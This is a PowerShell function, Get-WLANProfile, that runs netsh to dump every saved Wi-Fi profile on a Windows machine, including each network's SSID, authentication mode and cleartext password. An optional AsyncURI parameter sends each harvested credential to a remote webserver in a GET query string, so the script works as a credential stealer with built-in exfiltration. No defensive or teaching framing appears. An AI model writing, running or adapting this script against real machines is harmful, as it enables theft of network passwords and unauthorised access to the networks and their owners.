function Get-WLANProfile
{
	[CmdletBinding()]
	param(
		[Parameter(
			Position=0,
			HelpMessage='Indicates that this script will send the results back to a webserver instead of just showing the results')]
		[String]$AsyncURI
	)

	Begin{

	}

	Process {
		# Get all WLAN Profiles from netsh
		$Netsh_WLANProfiles = (netsh WLAN show profiles)

		# Some vars to filter netsh results
		$IsProfile = 0
		$WLAN_Names = @()
		
		# Filter result and get the wlan profile names
		foreach($Line in $Netsh_WLANProfiles)
		{
			if((($IsProfile -eq 2)) -and (-not([String]::IsNullOrEmpty($Line))))
			{
				$WLAN_Names += $Line.Split(':')[1].Trim()
			}
		
			if($Line.StartsWith("---"))
			{
				$IsProfile += 1
			}
		}

		# Get details from every wlan profile, using the name (ssid/password/authentification/etc.)
		foreach($WLAN_Name in $WLAN_Names)
		{
			$Netsh_WLANProfile = (netsh WLAN show profiles name="$WLAN_Name" key=clear)
		
			# Counter to filter netsh result... (useful for multiple languages / split would only work for one language )
			$InProfile = 0
			$IsConnectivity = 0
			$IsSecurity = 0
		
			foreach($Line in $Netsh_WLANProfile)
			{
				if((($InProfile -eq 2)) -and (-not([String]::IsNullOrEmpty($Line))))
				{			
					
					if($IsConnectivity -eq 1) 
					{ 
						$WLAN_SSID = $Line.Split(':')[1].Trim()
						$WLAN_SSID = $WLAN_SSID.Substring(1,$WLAN_SSID.Length -2)
					}

					$IsConnectivity += 1
				}

				if((($InProfile -eq 3)) -and (-not([String]::IsNullOrEmpty($Line))))
				{			
					if($IsSecurity -eq 0) # Get the authentication mode
					{
						$WLAN_Authentication = $Line.Split(':')[1].Trim()
					}
					elseif($IsSecurity -eq 3) # Get the password
					{
						$WLAN_Password = $Line.Split(':')[1].Trim()
					}
				
					$IsSecurity += 1   
				}
		
				if($Line.StartsWith("---"))
				{
					$InProfile += 1
				}   
			}

			$output = "$($WLAN_Name)::$($WLAN_SSID)::$($WLAN_Authentication)::$($WLAN_Password)"
			if($PSBoundParameters.ContainsKey('AsyncURI')) {
				$u = "$($AsyncURI)/?DATA=$($output)"
				Invoke-WebRequest -Uri $u -Method GET -UseBasicParsing
			} else {
				Write-Output $output
			}
	        
		}
	}

	End{
		
	}
}
